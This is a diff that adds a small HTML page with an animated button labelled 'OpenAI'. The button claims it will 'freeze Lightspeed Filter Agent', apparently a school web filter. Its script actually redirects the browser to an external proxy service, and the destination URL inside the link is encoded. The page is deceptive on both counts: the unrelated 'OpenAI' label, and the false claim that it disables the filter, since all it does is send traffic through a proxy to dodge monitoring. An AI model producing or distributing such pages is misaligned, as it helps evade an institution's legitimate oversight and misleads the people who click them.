@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+            overflow: hidden;
+        }
+        .button-container {
+            text-align: center;
+            position: relative;
+        }
+        .color-changing-bg {
+            background: linear-gradient(45deg, red, blue, purple, pink, orange, red);
+            border-radius: 10px;
+            padding: 10px 20px;
+            color: white;
+            cursor: pointer;
+            transition: background 3s ease;
+        }
+        .color-changing-bg:hover {
+            background: linear-gradient(45deg, orange, pink, purple, blue, red, orange);
+        }
+        .glowing-particles {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 200px;
+            height: 200px;
+            background: radial-gradient(circle, #ffffff 10%, transparent 30%);
+            animation: glowing 2s infinite;
+        }
+        @keyframes glowing {
+            0% {
+                transform: translate(-50%, -50%) scale(1);
+                opacity: 0.8;
+            }
+            50% {
+                transform: translate(-50%, -50%) scale(1.2);
+                opacity: 0.4;
+            }
+            100% {
+                transform: translate(-50%, -50%) scale(1);
+                opacity: 0.8;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="button-container">
+        <p>OpenAI</p>
+        <button class="color-changing-bg" onmousedown="openUrl()">press to freeze Lightspeed Filter Agent, switch to new tab immediately and come back so your computer doesn't freeze!</button>
+        <div class="glowing-particles"></div>
+    </div>
+    <script>
+        function openUrl() {
+            // Replace 'YOUR_URL_HERE' with the actual URL you want to open
+            window.location.href = 'https://im-not-advertising.6b8t.xyz/uv/service/hvtrs8%2F-wuw%2Cxtifems%2Ccmm-';
+        }
+    </script>
+</body>
+</html>
+
